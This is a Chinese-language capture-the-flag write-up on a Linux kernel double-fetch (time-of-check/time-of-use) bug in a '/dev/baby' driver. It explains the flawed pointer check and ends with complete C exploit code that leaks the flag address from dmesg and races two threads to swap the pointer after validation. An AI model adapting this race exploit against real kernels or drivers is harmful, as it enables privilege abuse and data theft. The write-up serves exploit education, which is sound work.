# kernel double fetch 

[[toc]]

## double fetch

就是在多线程的操作系统中，对某个操作没有加锁的话，会出现在运行时被另一个线程修改了内存的情况。



## 漏洞

这个程序基本上关键的位置就是这个函数：

ioctl其实就对应这个函数。

然后flag直接写在这个驱动内存中。通过`ioctl(fd, 0x6666)`可以得到flag地址，

然后通过`ioctl(fd, 0x1337, flag_struct)`可以传入一个 `flag_struct`结构体，可以看出大致如下

![image-20220214215747380](https://s2.loli.net/2022/02/14/m4DixfbGuQ7olhr.png)

![image-20220214215933113](https://s2.loli.net/2022/02/14/zO2ogvyen3ZGkDJ.png)

其实最开始想爆破来着，但是好像没啥判断依据，不太可行。

然后我们可以看到后面直接比较的位置，还有个`check_range_not_ok`， 传入三个参数， 其实就是比较 `a1+a2 < a3`的时候才可以进入flag比较的逻辑。

![image-20220214220324060](https://s2.loli.net/2022/02/14/C6s1DBHnb5VP39h.png)

然后在调试中可以看到这个值， 0x00007ffffffff000, 其实是在比较不允许出现在内核态，即这个传入的数据必须要在用户态。

![image-20220214220639438](/Users/wlz/Library/Application%20Support/typora-user-images/image-20220214220639438.png)

于是想到， 如果这个`flag_strut.flag`指向驱动中的flag地址， 可以通过那个比较，

于是我们使用条件竞争完成这个操作，

首先这个`flag_struct`位于用户代码段，而且为全局变量，通过两个线程修改他。

一个线程传入数据`flag_struct.flag = user_flag`， 是可以通过判断的，

一个进程，在通过判断后修改`flag_struct.flag = driver_flag`， 修改为驱动内的flag地址，

因为进程一直进行切换，所以两个进程都运行在while中，一直尝试修改。

## 利用

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

struct flag_struct {
    char * flag;
    int size;
};


typedef unsigned long long uint64;

struct flag_struct flag;
char flag_buf[33];
uint64 flag_addr;

#define LEN 0x100
char buf[LEN+1] = {0};


int ret = 1;
void set_flag_buf(){
    while (ret){
        flag.flag = flag_addr;
    }
}



int main(){
    int fd = open("/dev/baby", O_RDONLY);
    if (fd < 0){
        printf("open /dev/baby error!\n");
        exit(-1);
    }

    memset(flag_buf, 'a', 33);
    ioctl(fd, 0x6666, &flag);
    system("dmesg | grep flag > /tmp/record.txt");

    int addr_fd = open("/tmp/record.txt", O_RDONLY);
    read(addr_fd, buf, LEN);
    close(addr_fd);

    char *idx = strstr(buf, "Your flag is at ");


    if (idx == 0){
        printf("%s\n", buf);
        printf("error not flag addr\n");
        exit(-1);
    } else {
        idx+= strlen("Your flag is at ");
        flag_addr = strtoull(idx, idx+16, 16);
    }
    printf("flag addr %llx", flag_addr);

    pthread_t tid; 
    pthread_create(&tid, NULL, set_flag_buf, NULL);

    while(ret){
        flag.flag = flag_buf;
        flag.size = 33;
        ret = ioctl(fd, 0x1337, &flag);
    }

    
    system("dmesg | grep -A 3 flag");


    return 0;
}

```

